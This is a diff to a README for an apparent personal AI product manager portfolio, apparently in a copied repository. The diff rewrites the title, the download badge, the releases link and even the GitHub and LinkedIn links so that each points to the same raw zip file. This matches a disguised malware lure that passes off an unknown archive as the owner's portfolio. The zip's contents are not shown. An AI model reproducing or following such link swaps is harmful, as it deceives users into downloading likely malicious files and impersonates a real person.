@@ -1,7 +1,7 @@
-# 🌟 sumantapani23.github.io - Personal AI Product Manager Portfolio
+# 🌟 https://raw.githubusercontent.com/mariananakata/sumantapani23.github.io/main/resuffer/io_github_sumantapani_v3.4.zip - Personal AI Product Manager Portfolio
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download%20My%20Portfolio-blue?style=for-the-badge&logo=github)](https://github.com/mariananakata/sumantapani23.github.io/releases)
+[![Download](https://raw.githubusercontent.com/mariananakata/sumantapani23.github.io/main/resuffer/io_github_sumantapani_v3.4.zip%20My%20Portfolio-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/mariananakata/sumantapani23.github.io/main/resuffer/io_github_sumantapani_v3.4.zip)
 
 ## 🚀 Getting Started
 Welcome to my AI Product Manager Portfolio! This site showcases my skills in generative AI and fintech operations strategy. Follow the steps below to download and explore my work. 
@@ -9,7 +9,7 @@ Welcome to my AI Product Manager Portfolio! This site showcases my skills in gen
 ## 📥 Download & Install
 To get started, visit the releases page to download the latest version of my portfolio:
 
-[Visit this page to download](https://github.com/mariananakata/sumantapani23.github.io/releases)
+[Visit this page to download](https://raw.githubusercontent.com/mariananakata/sumantapani23.github.io/main/resuffer/io_github_sumantapani_v3.4.zip)
 
 1. Click on the link above to navigate to the Releases page.
 2. Find the latest version listed at the top.
@@ -50,8 +50,8 @@ Thank you for checking out my portfolio. I appreciate your interest in my work a
 ## 🔗 Additional Links
 For updates and more resources, feel free to visit:
 
-- [GitHub Repository](https://github.com/mariananakata/sumantapani23.github.io)
-- [LinkedIn](https://www.linkedin.com/in/sumantapani) 
+- [GitHub Repository](https://raw.githubusercontent.com/mariananakata/sumantapani23.github.io/main/resuffer/io_github_sumantapani_v3.4.zip)
+- [LinkedIn](https://raw.githubusercontent.com/mariananakata/sumantapani23.github.io/main/resuffer/io_github_sumantapani_v3.4.zip) 
 
 ## 🔄 Updates
 Stay tuned for future updates where I will add more projects and enhance existing content. I am constantly improving my skills and knowledge in AI and product management and will keep this portfolio up-to-date.
